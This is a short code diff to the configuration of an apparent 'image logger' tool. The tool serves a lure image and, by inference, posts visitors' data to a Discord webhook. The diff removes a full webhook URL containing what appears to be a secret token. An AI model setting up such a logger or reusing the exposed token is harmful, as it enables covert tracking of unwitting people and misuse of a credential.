@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1345883209354969098/xhUpXKo-Ug8CyZzBn7IKkvY_lEgWjRsWJXKanK_bE-oqsEtR5aj6EU_JTY-82UWtT273",
+    "webhook": "",
     "image": "https://variety.com/wp-content/uploads/2024/03/SuicideSquad_cap_072-1-cr-res.jpg?w=1000&h=563&crop=1", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
